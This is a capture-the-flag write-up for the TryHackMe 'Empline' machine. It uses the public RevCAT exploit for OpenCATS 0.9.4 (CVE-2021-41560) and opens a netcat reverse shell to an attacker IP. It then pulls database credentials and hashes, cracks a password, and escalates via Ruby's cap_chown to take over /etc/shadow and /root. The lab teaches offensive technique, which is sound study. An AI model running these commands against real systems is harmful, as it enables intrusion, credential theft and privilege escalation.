# Empline - TryHackMe Writeup

## Overview

Today we are going to solve another **Linux-based TryHackMe** challenge named **Empline**.

Our objective is to enumerate the target machine, identify vulnerable services, gain an initial foothold, enumerate the internal application, recover user credentials, and finally escalate our privileges to obtain full control of the system.

---

# Target Information

**Machine IP**

```text
10.49.136.215
```

---

# Reconnaissance

As always, the first step is to perform a full TCP port scan to identify all exposed services.

```bash
nmap -p- 10.49.136.215
```

The scan reveals three open ports.

```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

The exposed attack surface consists of:

* SSH
* Apache Web Server
* MariaDB Database Server

To gather additional information about these services, we perform service version detection together with the default NSE scripts.

```bash
nmap -sC -sV 10.49.136.215
```

Output:

```text
22/tcp   open  ssh
OpenSSH 7.6p1 Ubuntu 4ubuntu0.3

80/tcp   open  http
Apache 2.4.29 (Ubuntu)

3306/tcp open  mysql
MariaDB 10.1.48
```

Important observations:

* Apache 2.4.29 is hosting the main website.
* SSH is available for remote access.
* MariaDB is externally accessible.
* The website title is **Empline**.

The web application becomes the primary attack surface.

---

# Web Enumeration

Browsing the homepage presents a standard corporate website.

Initial manual enumeration includes:

* Viewing the page source
* Browser Developer Tools
* Burp Suite interception

While inspecting the HTML source code, an interesting entry appears inside the navigation menu.

```html
<a href="http://job.empline.thm/careers" class="menu-item">
Employment
</a>
```

This immediately suggests the existence of another virtual host.

---

# Discovering a New Subdomain

The discovered hostname is:

```text
job.empline.thm
```

Since virtual hosts require local DNS resolution, it is added to the hosts file.

```bash
echo "10.49.136.215 job.empline.thm" | sudo tee -a /etc/hosts
```

After refreshing the browser, the employment portal becomes accessible.

---

# Job Portal Enumeration

The newly discovered application presents a recruitment portal.

Browsing through the application reveals a login interface.

Instead of immediately attacking the login page, we inspect the page source.

Inside the JavaScript code, two functions immediately stand out.

```javascript
function demoLogin()
{
document.getElementById('username').value='john@mycompany.net';
document.getElementById('password').value='john99';
document.getElementById('loginForm').submit();
}

function defaultLogin()
{
document.getElementById('username').value='admin';
document.getElementById('password').value='cats';
}
```

These credentials appear to be demonstration or default accounts included by the developers.

Although they are useful information, they are not required for the exploitation path.

---

# Identifying the Application

Further inspection of the portal reveals the application version.

```text
Version 0.9.4
```

The software is identified as:

```text
OpenCATS
Version 0.9.4
```

Knowing the exact application version is extremely valuable because it allows us to search for publicly disclosed vulnerabilities affecting that release.

Research immediately identifies the application as vulnerable to:

```text
CVE-2021-41560
```

---

# Understanding CVE-2021-41560

OpenCATS 0.9.4 contains a vulnerability that allows **authenticated Remote Code Execution**.

The issue exists because file upload functionality can be abused to upload a malicious PHP payload.

Once uploaded, the payload becomes accessible from the web server, resulting in arbitrary command execution.

Instead of exploiting the vulnerability manually, a public exploit already automates the attack.

Repository:

```text
https://github.com/Nickguitar/RevCAT
```

The exploit automatically:

* Detects the OpenCATS version
* Creates a malicious PHP payload
* Uploads it through the vulnerable endpoint
* Locates an active job posting
* Triggers execution
* Provides a remote shell

---

# Exploiting OpenCATS

After cloning the repository, make the exploit executable.

```bash
chmod +x RevCAT.sh
```

Run the exploit.

```bash
./RevCAT.sh http://job.empline.thm/
```

Output:

```text
Checking CATS version...

Version detected:
0.9.4

Creating payload...

Jobs found!

Payload uploaded!

Got shell!
```

The exploit successfully uploads the malicious PHP file and executes it through the vulnerable application.

Checking our privileges:

```bash
whoami
```

Output:

```text
www-data
```

The initial foothold has been obtained as the web server user.

---

# Upgrading the Shell

To obtain a fully interactive shell, a reverse shell is established using BusyBox Netcat.

Listener:

```bash
nc -lvnp 4444
```

Target:

```bash
busybox nc <ATTACKER-IP> 4444 -e /bin/bash
```

The reverse connection is received successfully.

Next, the shell is stabilized using Python.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the shell.

```text
CTRL+Z
```

Fix the terminal.

```bash
stty raw -echo
fg
```

Finally:

```bash
export TERM=xterm
```

At this stage we have a fully interactive TTY shell.

---

# Local Enumeration

With a stable shell established, local enumeration begins.

Exploring the OpenCATS installation directory reveals the application's configuration file.

Inside it we find the database credentials.

```php
define('DATABASE_USER','james');

define('DATABASE_PASS','ng6pUFvsGNtw');

define('DATABASE_HOST','localhost');

define('DATABASE_NAME','opencats');
```

This is an extremely valuable discovery.

Instead of exploiting another vulnerability, we can directly authenticate to the backend MariaDB instance.

---

# Database Enumeration

Connect to MariaDB using the recovered credentials.

```bash
mysql -u james -p
```

Password:

```text
ng6pUFvsGNtw
```

Checking available databases:

```sql
SHOW DATABASES;
```

Output:

```text
information_schema

opencats
```

Switch to the OpenCATS database.

```sql
USE opencats;
```

Enumerating the users table reveals multiple application accounts.

```sql
SELECT * FROM user;
```

Interesting entries:

```text
george

86d0dfda99dbebc424eb4407947356ac
```

```text
james

e53fbdb31890ff3bc129db0e27c473c9
```

The stored password hashes are unsalted MD5 hashes, making them relatively easy to crack.

---

# Cracking George's Password

The hash belonging to **george** is cracked successfully.

Recovered password:

```text
pretonnevippasempre
```

Rather than authenticating through SSH, we first attempt to switch users locally.

```bash
su george
```

Password:

```text
pretonnevippasempre
```

Authentication succeeds.

Checking our identity:

```bash
whoami
```

Output:

```text
george
```

---

# User Flag

Moving into George's home directory reveals the user flag.

```bash
cat ~/user.txt
```

Output:

```text
91cb89c70aa2e5ce0e0116dab099078e
```

At this point we have successfully:

* Enumerated the exposed services.
* Discovered a hidden virtual host.
* Identified OpenCATS 0.9.4.
* Researched **CVE-2021-41560**.
* Exploited the vulnerable application using RevCAT.
* Obtained a shell as **www-data**.
* Stabilized the reverse shell.
* Extracted database credentials.
* Connected to MariaDB.
* Retrieved user password hashes.
* Cracked George's password.
* Switched to the **george** user.
* Retrieved the user flag.

The next step is to perform privilege escalation and attempt to obtain root access.

# Privilege Escalation

After obtaining access as the **george** user and successfully retrieving the user flag, the next objective is to enumerate the system for privilege escalation opportunities.

The first step is to check whether George has any sudo permissions.

```bash
sudo -l
```

Unfortunately, George is not allowed to execute any commands with sudo.

Since the standard sudo vector is unavailable, we proceed with further local enumeration.

---

# Enumerating Linux Capabilities

Besides checking SUID binaries, another important enumeration step is searching for binaries with Linux **Capabilities** assigned.

Capabilities provide fine-grained privileges to executables without granting them full root permissions.

To enumerate them, execute:

```bash
getcap -r / 2>/dev/null
```

Output:

```text
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/local/bin/ruby = cap_chown+ep
```

The `mtr-packet` capability is not useful for privilege escalation in this scenario.

However, the Ruby binary immediately stands out.

```text
/usr/local/bin/ruby = cap_chown+ep
```

---

# Understanding cap_chown

The capability:

```text
cap_chown
```

allows a process to change the ownership of files without requiring root privileges.

Normally, changing ownership using `chown` is a privileged operation restricted to the root user.

Since the Ruby interpreter has been granted this capability, any Ruby script executed through this binary can invoke the `chown()` system call and change ownership of arbitrary files.

This represents a serious security misconfiguration because it allows privilege escalation without exploiting a traditional software vulnerability.

---

# Exploiting the Ruby Capability

Using the vulnerable Ruby binary, we first change the ownership of `/etc/shadow`.

```bash
/usr/local/bin/ruby -e "File.chown(1002,1002,'/etc/shadow')"
```

After successfully changing the owner, we modify the file permissions.

```bash
chmod 777 /etc/shadow
```

At this point, the shadow file becomes writable by our user.

Although modifying `/etc/shadow` is one possible privilege escalation method, another, cleaner approach is to abuse the capability directly against the root directory.

---

# Taking Ownership of the Root Directory

Instead of modifying passwords, we use Ruby's `FileUtils.chown_R()` function to recursively change the ownership of `/root`.

```bash
/usr/local/bin/ruby -e 'require "fileutils"; FileUtils.chown_R("george","george","/root/")'
```

This command recursively changes the ownership of the entire `/root` directory from **root** to **george**.

Because the Ruby interpreter possesses the `cap_chown` capability, the operation succeeds even though George is not the root user.

---

# Accessing the Root Directory

Now that George owns the `/root` directory, it becomes accessible.

```bash
cd /root
```

Listing the directory:

```bash
ls
```

Output:

```text
root.txt
```

Reading the root flag:

```bash
cat root.txt
```

Output:

```text
74fea7cd0556e9c6f22e6f54bc68f5d5
```

The machine has now been fully compromised.

---

# Complete Attack Chain

```text
Nmap Scan
      │
      ▼
Apache Web Server
      │
      ▼
Source Code Review
      │
      ▼
Discover job.empline.thm
      │
      ▼
OpenCATS Portal
      │
      ▼
Version Enumeration
      │
      ▼
OpenCATS 0.9.4
      │
      ▼
CVE-2021-41560
      │
      ▼
RevCAT Exploit
      │
      ▼
Remote Code Execution
      │
      ▼
Shell as www-data
      │
      ▼
Stabilize Reverse Shell
      │
      ▼
Read Configuration File
      │
      ▼
Recover MariaDB Credentials
      │
      ▼
Database Enumeration
      │
      ▼
Extract Password Hashes
      │
      ▼
Crack George's Password
      │
      ▼
Switch User (su george)
      │
      ▼
User Flag
      │
      ▼
Capability Enumeration
      │
      ▼
Ruby (cap_chown)
      │
      ▼
Change Ownership of /root
      │
      ▼
Read root.txt
```

---

# Vulnerabilities Identified

During the assessment, multiple weaknesses were chained together to achieve full system compromise.

* Hidden subdomain disclosure in the application's source code.
* Outdated **OpenCATS 0.9.4** installation.
* **CVE-2021-41560** allowing Remote Code Execution.
* Database credentials stored in plaintext configuration files.
* Weak user password stored as an MD5 hash.
* Password successfully cracked offline.
* Misconfigured Linux capability (`cap_chown`) assigned to the Ruby interpreter.
* Insecure file ownership controls allowing unauthorized access to sensitive system files.

---

# MITRE ATT&CK Mapping

| Technique                                   | ID        |
| ------------------------------------------- | --------- |
| Exploit Public-Facing Application           | T1190     |
| Command and Scripting Interpreter           | T1059     |
| Command Shell                               | T1059.004 |
| Valid Accounts                              | T1078     |
| Credentials from Configuration Files        | T1552.001 |
| OS Credential Dumping / Credential Access   | T1003     |
| Abuse Elevation Control Mechanism           | T1548     |
| File and Directory Permissions Modification | T1222     |

---

# Tools Used

* Nmap
* Burp Suite
* Browser Developer Tools
* RevCAT
* Netcat
* Python
* MariaDB Client
* Hash Cracking Tool
* Ruby
* Linux Capabilities (`getcap`)

---

# Lessons Learned

This machine demonstrates how several individually moderate weaknesses can be combined into a complete system compromise.

The attack began with simple web enumeration, where reviewing the HTML source code exposed an additional virtual host. That hidden application was identified as **OpenCATS 0.9.4**, a version vulnerable to **CVE-2021-41560**, allowing Remote Code Execution through the RevCAT exploit.

After gaining access as the **www-data** user, sensitive configuration files exposed plaintext database credentials. Access to the backend MariaDB database revealed user password hashes, and a weak password enabled offline cracking, providing access to the **george** account.

The final privilege escalation did not rely on sudo or SUID binaries. Instead, it exploited a misconfigured Linux capability assigned to the Ruby interpreter. Because Ruby possessed the `cap_chown` capability, it was possible to change the ownership of the `/root` directory and access the root flag without requiring root authentication.

This challenge highlights the importance of patching vulnerable web applications, protecting configuration files, enforcing strong password policies, and carefully auditing Linux capabilities assigned to executables.

---

# Flags

## User Flag

```text
91cb89c70aa2e5ce0e0116dab099078e
```

## Root Flag

```text
74fea7cd0556e9c6f22e6f54bc68f5d5
```

---

# Conclusion

The **Empline** machine provides an excellent demonstration of a realistic multi-stage attack against a Linux web server. Beginning with hidden virtual host discovery and exploitation of **OpenCATS CVE-2021-41560**, the attack progresses through credential harvesting from application configuration files, database enumeration, offline password cracking, and finally privilege escalation through an insecure Linux capability assigned to the Ruby interpreter.

Unlike traditional privilege escalation techniques that rely on sudo misconfigurations or SUID binaries, this challenge showcases the risks associated with improperly assigned Linux capabilities. It reinforces the importance of secure application deployment, protection of sensitive configuration data, regular software patching, and careful auditing of privileged binaries to prevent attackers from chaining seemingly minor weaknesses into complete system compromise.

---

**Machine Status:** Complete ✅
